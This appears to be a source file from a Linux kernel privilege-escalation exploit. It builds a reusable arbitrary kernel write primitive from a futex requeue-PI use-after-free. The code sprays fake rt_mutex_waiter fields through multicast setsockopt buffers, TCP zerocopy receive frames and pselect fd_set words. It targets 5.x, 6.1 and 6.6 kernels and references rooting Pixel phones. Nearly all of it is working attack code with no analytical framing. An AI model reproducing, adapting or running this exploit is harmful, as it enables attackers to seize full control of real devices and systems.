#include "common.h"
#include "../glk_session.h"
#include <time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}


/* 5.x kernel route. The multicast option buffer overlaps the stale compact
 * waiter. Profiles opt in with kernel_major=5 and mcast_waiter_off. */
/* Resident-writer state lives in Glk43499Session.rt; see glk_session.h. */

static void mr_intr(int sig) { (void)sig; }
static long mr_adjust(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  struct sched_param sp = {.sched_priority = 0};
  int next = rt->mr_policy == SCHED_NORMAL ? SCHED_BATCH : SCHED_NORMAL;
  long r = syscall(SYS_sched_setscheduler, atomic_load(&rt->mr_y_tid), next, &sp);
  rt->mr_policy = next;
  return r;
}
static void mr_stamp(Glk43499Session *s, uintptr_t target, uintptr_t value,
                     uintptr_t lock) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  size_t size = t->mcast_buffer_size;
  unsigned char b[size];
  size_t o = t->mcast_waiter_off;
  memset(b, 0, sizeof(b));
  if (target) { put64(b, o, (target - 8) & ~(uintptr_t)3); put64(b, o + 8, value); }
  put64(b, o + t->mcast_task_offset, rt->mr_task);
  put64(b, o + t->mcast_lock_offset, lock);
  uint16_t family = AF_UNSPEC; memcpy(b + 8, &family, sizeof(family));
  setsockopt(rt->mr_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, b, sizeof(b));
}
static void *mr_y(void *arg) {
  Glk43499Session *s = arg;
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  pin_to_core(CONSUMER_CORE(s));
  sigset_t set; sigemptyset(&set); sigaddset(&set, SIGUSR1);
  pthread_sigmask(SIG_UNBLOCK, &set, NULL);
  atomic_store(&rt->mr_y_tid, syscall(SYS_gettid));
  futex_op(&rt->mr_l2, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  atomic_store(&rt->mr_y_l2, 1);
  while (!atomic_load(&rt->mr_x_l1)) sched_yield();
  atomic_store(&rt->mr_y_wait, 1);
  futex_op(&rt->mr_cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, NULL, &rt->mr_l1, 0);
  rt->mr_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (rt->mr_fd < 0) return NULL;
  mr_stamp(s, 0, 0, rt->mr_lock); atomic_store(&rt->mr_y_done, 1);
  while (!atomic_load(&rt->mr_stop)) {
    if (atomic_exchange(&rt->mr_respray, 0)) {
      uintptr_t lock = rt->mr_lock + t->mcast_lock_slots_offset +
          (rt->mr_lock_slot++ % t->mcast_lock_slot_count) *
              t->mcast_lock_slot_stride;
      mr_stamp(s, rt->mr_target, rt->mr_value, lock);
      atomic_store(&rt->mr_sprayed, 1);
    }
    sched_yield();
  }
  uint32_t dummy = 0x80000000U | (uint32_t)getpid(); struct timespec z = {0,0};
  futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, NULL, 0);
  futex_op(&rt->mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  while (!atomic_load(&rt->mr_x_done)) sched_yield();
  close(rt->mr_fd); rt->mr_fd = -1; return NULL;
}
static void *mr_x(void *arg) {
  Glk43499Session *s = arg;
  Glk43499Runtime *rt = &s->rt;
  pin_to_core(CORE(s));
  while (!atomic_load(&rt->mr_y_l2)) sched_yield();
  futex_op(&rt->mr_l1, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  atomic_store(&rt->mr_x_l1, 1); atomic_store(&rt->mr_x_wait, 1);
  futex_op(&rt->mr_l2, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  futex_op(&rt->mr_l1, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  futex_op(&rt->mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  atomic_store(&rt->mr_x_done, 1); return NULL;
}
int kernel5_resident_start(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  if (rt->mr_ready) return 1;
  uintptr_t bss = data_addr(&s->target, s->target.layout.kimage_text_base + t->off_mcast_fake_bss);
  rt->mr_lock = bss + t->mcast_fake_lock_offset;
  rt->mr_task = bss + t->mcast_fake_task_offset;
  rt->mr_l1 = rt->mr_l2 = rt->mr_cond = 0;
  rt->mr_policy = SCHED_NORMAL; rt->mr_lock_slot = 0;
  atomic_store(&rt->mr_y_l2,0); atomic_store(&rt->mr_x_l1,0);
  atomic_store(&rt->mr_y_wait,0); atomic_store(&rt->mr_x_wait,0);
  atomic_store(&rt->mr_y_done,0); atomic_store(&rt->mr_stop,0);
  atomic_store(&rt->mr_x_done,0); atomic_store(&rt->mr_respray,0);
  struct sigaction sa={0}; sa.sa_handler=mr_intr; sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1,&sa,NULL) ||
      pthread_create(&rt->mr_ty,NULL,mr_y,s) ||
      pthread_create(&rt->mr_tx,NULL,mr_x,s)) return 0;
  while (!(atomic_load(&rt->mr_y_l2)&&atomic_load(&rt->mr_x_l1)&&
           atomic_load(&rt->mr_y_wait)&&atomic_load(&rt->mr_x_wait))) sched_yield();
  usleep(s->config.w1_settle_us * 2); errno=0;
  long r=futex_op(&rt->mr_cond,FUTEX_CMP_REQUEUE_PI_PRIVATE,1,(void*)0,&rt->mr_l1,0);
  rt->mr_cond=1;
  syscall(SYS_tgkill,getpid(),atomic_load(&rt->mr_y_tid),SIGUSR1);
  if (r>=0 || (errno!=EDEADLK && errno!=EDEADLOCK)) return 0;
  for(int i=0;i<10000000&&!atomic_load(&rt->mr_y_done);i++) sched_yield();
  if(!atomic_load(&rt->mr_y_done) || mr_adjust(s)<0) return 0;
  usleep(s->config.w1_settle_us); rt->mr_ready=1;
  pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",
             bss,rt->mr_lock,rt->mr_task);
  return 1;
}
int kernel5_resident_write(Glk43499Session *s, uintptr_t target, uintptr_t value) {
  Glk43499Runtime *rt = &s->rt;
  if(!rt->mr_ready) return 0;
  rt->mr_target=target; rt->mr_value=value;
  atomic_store(&rt->mr_sprayed,0); atomic_store(&rt->mr_respray,1);
  while(!atomic_load(&rt->mr_sprayed)) sched_yield();
  long r=mr_adjust(s);
  pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n",value,target,r);
  return r==0;
}
void kernel5_resident_stop(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  if(!rt->mr_ready) return;
  atomic_store(&rt->mr_stop,1);
  pthread_join(rt->mr_ty,NULL); pthread_join(rt->mr_tx,NULL);
  rt->mr_ready=0;
  close_reclaim_sockets(s); cleanup_page_prepare_state(s);
  pr_success("5.x resident writer disarmed\n");
}

/** @brief Build the multicast stamp that overlaps the stale PI waiter. */
static void k5_build_mcast_stamp(Glk43499Session *s, unsigned char *stamp,
                                size_t stamp_size) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  size_t waiter_off = (size_t)t->mcast_waiter_off;
  memset(stamp, 0, stamp_size);
  put64(stamp, waiter_off + t->mcast_task_offset, rt->fake_task);
  put64(stamp, waiter_off + t->mcast_lock_offset, rt->fake_lock);
  uint16_t family = AF_UNSPEC;
  memcpy(stamp + 8, &family, sizeof(family));
}

/** @brief Send the stamp and wait for the consumer's first call. */
static int k5_send_mcast_stamp(Glk43499Session *s, int fd,
                              const unsigned char *stamp, size_t stamp_size) {
  Glk43499Runtime *rt = &s->rt;
  atomic_store(&rt->consumer_calls, 0);
  atomic_store(&rt->consumer_success, 0);
  atomic_store(&rt->punch_consume_stop, 0);
  atomic_store(&rt->main_route_delay_usec, 0);
  errno = 0;
  int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, stamp_size);
  s->rt.route_last_step = 61; s->rt.route_last_errno = errno;
  atomic_store(&rt->punch_consume_go, 1);
  for (int spin = 0; spin < 100000000 && atomic_load(&rt->consumer_calls) == 0; spin++)
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&rt->punch_consume_go, 0);
  while (atomic_load(&rt->consumer_inflight)) __asm__ volatile("yield" ::: "memory");
  close(fd);
  return ret;
}

void do_kernel5_fake_lock_route(Glk43499Session *s, const GlkWriteRequest *req) {
  (void)req;
  size_t stamp_size = s->target.offsets.mcast_buffer_size;
  unsigned char stamp[stamp_size];
  k5_build_mcast_stamp(s, stamp, stamp_size);

  int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) { s->rt.route_last_step = 60; s->rt.route_last_errno = errno; return; }
  int ret = k5_send_mcast_stamp(s, fd, stamp, stamp_size);
  if (ret == 0 || atomic_load(&s->rt.consumer_success) > 0) {
    s->rt.route_last_step = 0; s->rt.route_last_errno = 0;
  }
}

/* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
 * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
 * waiter->lock. */

struct tcp_punch_state {
  Glk43499Session *s;
  int fd;
  size_t page_size;
};

static void tcp_wait_for_consumer_idle(Glk43499Session *s) {
  atomic_store(&s->rt.punch_consume_go, 0);
  while (atomic_load(&s->rt.consumer_inflight)) {
    __asm__ volatile("yield" ::: "memory");
  }
}

static int tcp_make_pair(int *client_fd, int *server_fd) {
  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0) {
    return -1;
  }
  int one = 1;
  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;

  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  socklen_t addr_len = sizeof(addr);
  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (*client_fd < 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }
  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    int saved = errno;
    close(*client_fd);
    *client_fd = -1;
    close(listener);
    errno = saved;
    return -1;
  }

  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  int saved = errno;
  close(listener);
  if (*server_fd < 0) {
    close(*client_fd);
    *client_fd = -1;
    errno = saved;
    return -1;
  }
  return 0;
}

static void *tcp_punch_thread(void *arg) {
  disable_rseq_for_thread();
  struct tcp_punch_state *state = arg;
  Glk43499Runtime *rt = &state->s->rt;
  while (!atomic_load(&rt->tcp_punch_go) && !atomic_load(&rt->tcp_punch_stop)) {
    sched_yield();
  }
  while (!atomic_load(&rt->tcp_punch_stop)) {
    if (fallocate(state->fd, 0, 0, state->s->config.tcp_punch_len) != 0) {
      atomic_store(&rt->tcp_punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch fill errno=%d\n", errno);
      break;
    }
    atomic_store(&rt->tcp_punch_phase, 1);
    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                  (off_t)state->page_size,
                  state->s->config.tcp_punch_len - state->page_size) != 0) {
      /* without the hole the target page keeps stale contents and the
       * zerocopy write misses */
      atomic_store(&rt->tcp_punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch hole errno=%d\n", errno);
    }
    atomic_store(&rt->tcp_punch_phase, 0);
    if (atomic_load(&rt->tcp_punch_failed)) {
      break;
    }
  }
  return NULL;
}

struct tcp_route_state {
  int client_fd;
  int server_fd;
  int punch_fd;
  char *map;
  size_t page_size;
  pthread_t puncher;
  int puncher_started;
  int route_ok;
  struct tcp_punch_state punch;
};

enum tcp_attempt { TCP_ATTEMPT_SUCCESS, TCP_ATTEMPT_RETRY, TCP_ATTEMPT_FAIL };

static void tcp_route_state_init(struct tcp_route_state *st) {
  st->client_fd = -1;
  st->server_fd = -1;
  st->punch_fd = -1;
  st->map = MAP_FAILED;
  st->page_size = 0;
  st->puncher_started = 0;
  st->route_ok = 0;
}

static int tcp_route_alloc(Glk43499Session *s, struct tcp_route_state *st) {
  long ps = sysconf(_SC_PAGESIZE);
  if (ps <= 0) {
    s->rt.route_last_step = 47;
    s->rt.route_last_errno = EINVAL;
    pr_error("tcp route pagesize failed\n");
    return -1;
  }
  st->page_size = (size_t)ps;

  if (tcp_make_pair(&st->client_fd, &st->server_fd) != 0) {
    s->rt.route_last_step = 41;
    s->rt.route_last_errno = errno;
    pr_error("tcp route pair setup failed errno=%d\n", errno);
    return -1;
  }

  st->punch_fd =
      (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
  if (st->punch_fd < 0 ||
      fallocate(st->punch_fd, 0, 0, s->config.tcp_punch_len) != 0) {
    s->rt.route_last_step = 42;
    s->rt.route_last_errno = errno;
    pr_error("tcp route memfd/fallocate errno=%d\n", errno);
    return -1;
  }
  st->map = mmap(NULL, s->config.tcp_punch_len, PROT_READ | PROT_WRITE,
                 MAP_SHARED, st->punch_fd, 0);
  if (st->map == MAP_FAILED) {
    s->rt.route_last_step = 43;
    s->rt.route_last_errno = errno;
    pr_error("tcp route mmap errno=%d\n", errno);
    return -1;
  }
  for (size_t off = 0; off < s->config.tcp_punch_len; off += st->page_size) {
    st->map[off] = 0x55;
  }
  return 0;
}

static int tcp_route_start_puncher(Glk43499Session *s,
                                   struct tcp_route_state *st) {
  Glk43499Runtime *rt = &s->rt;
  st->punch = (struct tcp_punch_state){
      .s = s, .fd = st->punch_fd, .page_size = st->page_size};
  atomic_store(&rt->tcp_punch_stop, 0);
  atomic_store(&rt->tcp_punch_phase, 0);
  atomic_store(&rt->tcp_punch_failed, 0);
  atomic_store(&s->rt.punch_consume_stop, 0);
  atomic_store(&s->rt.punch_consume_go, 0);
  atomic_store(&s->rt.consumer_calls, 0);
  atomic_store(&s->rt.consumer_success, 0);
  if (pthread_create(&st->puncher, NULL, tcp_punch_thread, &st->punch) != 0) {
    s->rt.route_last_step = 44;
    s->rt.route_last_errno = errno;
    pr_error("tcp route punch thread errno=%d\n", errno);
    return -1;
  }
  st->puncher_started = 1;
  return 0;
}

static enum tcp_attempt tcp_route_attempt(Glk43499Session *s,
                                          struct tcp_route_state *st, int i) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  const Glk43499Layout *L = &s->target.layout;
  int calls_before = atomic_load(&s->rt.consumer_calls);
  int success_before = atomic_load(&s->rt.consumer_success);
  char sendbuf[64];
  memset(sendbuf, 0x33, sizeof(sendbuf));

  (void)send(st->server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
  while (atomic_load(&rt->tcp_punch_phase)) {
    sched_yield();
  }
  for (int spin = 0;
       !atomic_load(&rt->tcp_punch_phase) &&
       !atomic_load(&rt->tcp_punch_failed) && spin < 10000000;
       spin++) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (atomic_load(&rt->tcp_punch_failed)) {
    s->rt.route_last_step = 46;
    s->rt.route_last_errno = atomic_load(&rt->tcp_punch_failed);
    pr_error("tcp route puncher failed errno=%d\n", s->rt.route_last_errno);
    return TCP_ATTEMPT_FAIL;
  }

  unsigned char zc[0x40];
  memset(zc, 0, sizeof(zc));
  put64(zc, 0x18, (uint64_t)(uintptr_t)(st->map + st->page_size));
  put32(zc, 0x20, sizeof(sendbuf));
  put64(zc, 0x28, SLIDE_INIT_TASK);
  put64(zc, 0x30, rt->fake_lock);

  socklen_t len = sizeof(zc);
  errno = 0;
  int ret = getsockopt(st->client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
                       &len);
  int saved_errno = errno;
  if (i >= (int)s->config.tcp_arm_seq && ret == 0) {
    atomic_store(&s->rt.punch_consume_go, i);
    for (uint32_t spin = 0; spin < s->config.tcp_post_hold; spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    tcp_wait_for_consumer_idle(s);
  }

  int calls = atomic_load(&s->rt.consumer_calls);
  int success = atomic_load(&s->rt.consumer_success);
  if (calls <= calls_before || success <= success_before) {
    if ((i % 100) == 0 || ret != 0) {
      pr_debug("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
              "success=%d\n",
              i, ret, saved_errno, len, calls, success);
    }
    return TCP_ATTEMPT_RETRY;
  }
  st->route_ok = 1;
  s->rt.route_last_step = 0;
  s->rt.route_last_errno = 0;
  return TCP_ATTEMPT_SUCCESS;
}

static void tcp_route_cleanup(Glk43499Session *s, struct tcp_route_state *st) {
  Glk43499Runtime *rt = &s->rt;
  atomic_store(&s->rt.punch_consume_go, 0);
  atomic_store(&s->rt.punch_consume_stop, 1);
  atomic_store(&rt->tcp_punch_go, 0);
  atomic_store(&rt->tcp_punch_stop, 1);
  if (st->puncher_started) {
    pthread_join(st->puncher, NULL);
    st->puncher_started = 0;
  }
  if (st->map != MAP_FAILED) {
    munmap(st->map, s->config.tcp_punch_len);
    st->map = MAP_FAILED;
  }
  if (st->punch_fd >= 0) {
    close(st->punch_fd);
    st->punch_fd = -1;
  }
  if (st->server_fd >= 0) {
    close(st->server_fd);
    st->server_fd = -1;
  }
  if (st->client_fd >= 0) {
    close(st->client_fd);
    st->client_fd = -1;
  }
  if (!st->route_ok && s->rt.route_last_step == 0) {
    s->rt.route_last_step = 45;
  }
  pr_debug("tcp route done=%d calls=%d success=%d step=%d errno=%d\n",
          st->route_ok, atomic_load(&s->rt.consumer_calls),
          atomic_load(&s->rt.consumer_success), s->rt.route_last_step,
          s->rt.route_last_errno);
}

/** @brief Allocate the TCP route state and start its puncher. */
static inline __attribute__((always_inline)) int
tcp_route_setup(Glk43499Session *s, struct tcp_route_state *st) {
  tcp_route_state_init(st);
  if (tcp_route_alloc(s, st) != 0) return -1;
  return tcp_route_start_puncher(s, st);
}

/** @brief Emit the route entry diagnostics from the prepared page. */
static inline __attribute__((always_inline)) void
tcp_route_log_enter(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  const Glk43499Layout *L = &s->target.layout;
  uintptr_t waiter_task = SLIDE_INIT_TASK;
  pr_debug("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
          "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
          rt->page_base, rt->fake_lock, rt->fake_w0, rt->fake_task,
          waiter_task, s->config.tcp_attempts, s->config.tcp_arm_seq,
          s->config.tcp_post_hold);
}

/** @brief Arm the puncher and run the bounded TCP attempts. */
static inline __attribute__((always_inline)) void
tcp_route_run(Glk43499Session *s, struct tcp_route_state *st) {
  Glk43499Runtime *rt = &s->rt;
  atomic_store(&rt->tcp_punch_go, 1);
  atomic_store(&s->rt.main_route_delay_usec, 0);
  for (uint32_t i = 1; i <= s->config.tcp_attempts; i++) {
    enum tcp_attempt at = tcp_route_attempt(s, st, i);
    if (at == TCP_ATTEMPT_SUCCESS || at == TCP_ATTEMPT_FAIL) break;
  }
}

void do_tcp_fake_lock_route(Glk43499Session *s, const GlkWriteRequest *req) {
  (void)req;
  Glk43499Runtime *rt = &s->rt;
  if (!rt->page_base || !rt->fake_lock || !rt->fake_fops) {
    s->rt.route_last_step = 40;
    s->rt.route_last_errno = 0;
    pr_error("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
             rt->page_base, rt->fake_lock, rt->fake_fops);
    return;
  }

  struct tcp_route_state st;
  int setup_ok = tcp_route_setup(s, &st) == 0;
  if (setup_ok) {
    tcp_route_log_enter(s);
    tcp_route_run(s, &st);
  }
  tcp_route_cleanup(s, &st);
}
static int route_delay_usec(int attempt, uint32_t delay_us) {
  (void)attempt;
  /* Both routes: let select/pselect establish its frame and stamp the
   * crafted waiter before the PI walk fires. */
  return (int)delay_us;
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(int nfds) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (nfds + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_waiter_shift(const struct kernel_offsets *t) {
  return t ? t->pselect_waiter_shift : PSELECT_WAITER_WORD_SHIFT;
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name,
    const struct kernel_offsets *t, int nfds) {
  int global_word = pselect_waiter_shift(t) + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               nfds);
  }
}

int open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd,
    int nfds) {
  /* every bit lands on the read end so select/pselect parks the full window */
  (void)write_fd;
  int high_read = fcntl(read_fd, F_DUPFD, nfds + 32);
  if (high_read < 0) {
    int saved = errno;
    pr_warning("pselect F_DUPFD read errno=%d\n", saved);
    errno = saved;
    return -1;
  }
  for (int fd = 0; fd < nfds; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, nfds - 1);
  FD_SET(nfds - 1, ex);
  return 0;
}

void reserve_standard_io(int backup_fd[3], int nfds) {
  for (int fd = 0; fd < 3; fd++) {
    if (backup_fd[fd] >= 0) continue;
    int backup = fcntl(fd, F_DUPFD, nfds + 64);
    if (backup < 0) {
      pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
    } else {
      backup_fd[fd] = backup;
    }
  }
}

static void restore_standard_io(const int backup_fd[3]) {
  for (int fd = 0; fd < 3; fd++) {
    if (backup_fd[fd] < 0) continue;
    dup2(backup_fd[fd], fd);
  }
}

static void close_standard_io_backups(int backup_fd[3]) {
  for (int fd = 0; fd < 3; fd++) {
    if (backup_fd[fd] < 0) continue;
    close(backup_fd[fd]);
    backup_fd[fd] = -1;
  }
}

void prepare_pselect_fdsets(Glk43499Session *s, const GlkWriteRequest *req,
                            fd_set *in, fd_set *out, fd_set *ex) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  const Glk43499Layout *L = &s->target.layout;
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int nfds = (int)s->config.select_nfds;
  int words_per_set = pselect_words_per_set(nfds);
  int compact = t && t->compact_waiter;

  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

  if (compact) {
    /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
     * the write value, children the write target; waiter->task is the
     * payload fake_task (planted fields for the PI walk). */
    struct pselect_waiter_word words[] = {
      {2, rt->fake_right, "tree_pc"},
      {3, 0, "tree_right"},
      {4, req->target, "tree_left"},
      {5, rt->fake_right, "pi_pc"},
      {6, 0, "pi_right"},
      {7, req->target, "pi_left"},
      {8, rt->fake_task, "task"},
      {9, rt->fake_lock, "lock"},
      {10, ((uint64_t)L->fake_waiter_prio << 32) | 3, "wake_prio"},
      {11, 0, "deadline"},
      {12, 0, "ww_ctx"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name, t, nfds);
    }
  } else {
    /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
    struct pselect_waiter_word words[] = {
      {2, 0, "tree_pc"},
      {3, 0, "tree_right"},
      {4, 0, "tree_left"},
      {5, 1, "tree_prio"},
      {6, 0, "tree_deadline"},
      {7, 0, "pi_parent"},
      {8, 0, "pi_right"},
      {9, 0, "pi_left"},
      {10, 1, "pi_prio"},
      {11, 0, "pi_deadline"},
      {12, rt->fake_task, "task"},
      {13, rt->fake_lock, "lock"},
      {14, 3, "wake_state"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name, t, nfds);
    }
  }
}

struct pselect_route_state {
  int pipefd[2];
  int block_fd;
  int high_read;
  int compact_route;
  int delay_usec;
  int stdio_backup[3];
  fd_set in;
  fd_set out;
  fd_set ex;
  struct timespec t0;
  int ret;
  int saved_errno;
  int calls;
  int success;
  int consumer_stuck;
};

static void pselect_route_state_init(struct pselect_route_state *st) {
  st->pipefd[0] = -1;
  st->pipefd[1] = -1;
  st->block_fd = -1;
  st->high_read = -1;
  st->compact_route = 0;
  st->delay_usec = 0;
  for (int i = 0; i < 3; i++) st->stdio_backup[i] = -1;
  st->ret = 0;
  st->saved_errno = 0;
  st->calls = 0;
  st->success = 0;
  st->consumer_stuck = 0;
}

static void pselect_route_setup_cleanup(struct pselect_route_state *st) {
  restore_standard_io(st->stdio_backup);
  close_standard_io_backups(st->stdio_backup);
  if (st->high_read >= 0) {
    close(st->high_read);
    st->high_read = -1;
  }
  if (st->block_fd >= 0 && st->block_fd != st->pipefd[0]) {
    close(st->block_fd);
    st->block_fd = -1;
  }
  if (st->pipefd[0] >= 0) {
    close(st->pipefd[0]);
    st->pipefd[0] = -1;
  }
  if (st->pipefd[1] >= 0) {
    close(st->pipefd[1]);
    st->pipefd[1] = -1;
  }
}

/** @brief Create the pipe/timerfd and duplicate the blocking read end. */
static int pselect_open_block_fd(Glk43499Session *s,
                                 struct pselect_route_state *st, int nfds) {
  const struct kernel_offsets *t = &s->target.offsets;
  SYSCHK(pipe(st->pipefd));
  st->compact_route = t && t->compact_waiter;
  st->block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (st->block_fd < 0) {
    pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    st->block_fd = st->pipefd[0];
  }
  st->high_read = fcntl(st->block_fd, F_DUPFD, nfds + 16);
  if (st->high_read < 0) {
    s->rt.route_last_step = 31;
    s->rt.route_last_errno = errno;
    pr_error("pselect F_DUPFD read errno=%d\n", errno);
    pselect_route_setup_cleanup(st);
    return -1;
  }
  return 0;
}

/** @brief Reserve stdio and open the selected fd set. */
static int pselect_open_selected(Glk43499Session *s,
                                 struct pselect_route_state *st, int nfds) {
  reserve_standard_io(st->stdio_backup, nfds);
  if (open_selected_fds(&st->in, &st->out, &st->ex, st->high_read,
                        st->pipefd[1], nfds) != 0) {
    s->rt.route_last_step = 31;
    s->rt.route_last_errno = errno;
    pselect_route_setup_cleanup(st);
    return -1;
  }
  close(st->high_read);
  st->high_read = -1;
  return 0;
}

/** @brief Reset consumer counters and arm the pselect window. */
static void pselect_publish_setup(Glk43499Session *s,
                                  struct pselect_route_state *st) {
  atomic_store(&s->rt.consumer_calls, 0);
  atomic_store(&s->rt.consumer_success, 0);
  atomic_store(&s->rt.punch_consume_stop, 0);
  st->delay_usec = route_delay_usec(1, s->config.select_enter_delay_us);
  atomic_store(&s->rt.main_route_delay_usec, st->delay_usec);
  atomic_store(&s->rt.punch_consume_go, 1);
  pr_debug("pselect pre-select compact=%d +%.0fms\n", st->compact_route,
           fops_elapsed_ms(&st->t0));
}

static int pselect_route_setup(Glk43499Session *s, const GlkWriteRequest *req,
                               struct pselect_route_state *st) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;

  clock_gettime(CLOCK_MONOTONIC, &st->t0);
  int nfds = (int)s->config.select_nfds;
  if (pselect_open_block_fd(s, st, nfds) != 0) return -1;

  prepare_pselect_fdsets(s, req, &st->in, &st->out, &st->ex);
  pr_debug("pselect route setup shift=%d page=%016zx "
          "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
          "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
          "ex1=%016llx ex2=%016llx ex3=%016llx\n",
          pselect_waiter_shift(t),
          rt->page_base, rt->fake_lock, rt->fake_w0, rt->fake_task,
          (unsigned long long)fdset_get_word(&st->in, 0),
          (unsigned long long)fdset_get_word(&st->in, 3),
          (unsigned long long)fdset_get_word(&st->out, 0),
          (unsigned long long)fdset_get_word(&st->ex, 0),
          (unsigned long long)fdset_get_word(&st->ex, 1),
          (unsigned long long)fdset_get_word(&st->ex, 2),
          (unsigned long long)fdset_get_word(&st->ex, 3));

  if (pselect_open_selected(s, st, nfds) != 0) return -1;

  pselect_publish_setup(s, st);
  return 0;
}

/** @brief Issue the pselect/select call selected by compact_waiter. */
